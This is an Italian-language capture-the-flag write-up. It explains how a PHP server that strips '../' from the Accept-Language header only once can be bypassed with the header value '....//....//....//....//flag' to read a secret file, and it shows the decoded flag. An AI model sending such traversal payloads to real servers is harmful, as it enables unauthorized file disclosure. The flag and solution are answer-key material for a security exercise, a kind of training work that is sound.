
# Write Up

Quando si effettua una richiesta, il codice sorgente del web server php
viene mostrato in chiaro
```php
<?php
  highlight_file(__FILE__);
  $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'ot';
  $lang = explode(',', $lang)[0];
  $lang = str_replace('../', '', $lang);
  $c = file_get_contents("flags/$lang");
  if (!$c) $c = file_get_contents("flags/ot");
  echo '<img src="data:image/jpeg;base64,' . base64_encode($c) . '">';
```

A riga 4 si nota che viene effettuato `str_replace('../', '', $lang)` sull'header
`ACCEPT_LANGUAGE`, tuttavia questa funzione non viene ripetuta ricorsivamente sulla stringa
quindi inviando una richiesta con header `Accept-Language: ....//....//....//....//flag`, è
possibile chiedere al server di ritornare come immagine `flags/../../../../flag` che in realtà
non è un file immagine, poiché il file `flag` contiene la flag cercata

L'immagine ottenuta è `<img src="data:image/jpeg;base64,MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=">`.
Prendo il valore in base64 `MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=` e una volta decodificato ritorna
la flag cercata

# Flag
```plain
35c3_this_flag_is_the_be5t_fl4g
```